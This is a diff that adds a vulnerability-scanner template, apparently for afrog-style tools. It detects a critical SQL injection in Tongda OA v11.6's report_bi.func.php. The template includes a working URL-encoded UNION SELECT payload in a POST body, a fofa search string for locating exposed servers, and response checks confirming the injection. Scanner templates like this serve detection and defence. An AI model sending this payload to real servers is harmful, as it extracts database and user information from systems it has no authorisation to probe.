@@ -1,0 +1,22 @@
+id: tongda-report-bi-func-sqli
+
+info:
+  name: 通达OA v11.6 report_bi.func.php SQL注入漏洞
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |
+    通达OA v11.6 report_bi.func.php 存在SQL注入漏洞，攻击者通过漏洞可以获取数据库信息
+    fofa: app="TDXK-通达OA"
+  tags: tongda,oa,report,bi,func,sqli
+  created: 2025/03/13
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /general/bi_design/appcenter/report_bi.func.php
+      body: |
+        _POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&
+    expression: response.status == 200  && response.body.bcontains(b'"col":') && response.body.bcontains(b'"td_oa"') && response.body.bcontains(b'"target":') && response.body.bcontains(b'"para":')
+expression: r0()
